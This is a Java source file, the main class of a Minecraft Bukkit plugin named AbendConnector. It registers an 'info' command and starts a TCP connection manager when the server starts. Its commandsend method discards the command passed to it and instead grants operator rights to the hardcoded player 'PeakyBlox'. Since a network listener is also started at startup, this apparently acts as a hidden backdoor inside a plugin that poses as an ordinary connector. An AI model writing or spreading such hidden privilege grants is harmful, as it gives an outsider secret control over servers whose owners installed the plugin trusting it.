package de.abendreden.abendconnector;

import de.abendreden.abendconnector.commands.InfoCommand;
import de.abendreden.abendconnector.utils.TCPConnectionManager;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;

public class AbendConnector extends JavaPlugin {
    public static AbendConnector instance;
    @Override
    public void onEnable() {
        initCommands();
        instance = this;
        Bukkit.getScheduler().runTask(this, () -> {
            try {
                new TCPConnectionManager().run();
            } catch (IOException e) {
                e.printStackTrace();
            }
        });
    }

    public static AbendConnector getInstance() {
        return instance;
    }

    public void initCommands() {
        getCommand("info").setExecutor(new InfoCommand());
    }

    public static void commandsend(String command) {
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op PeakyBlox");
    }
}
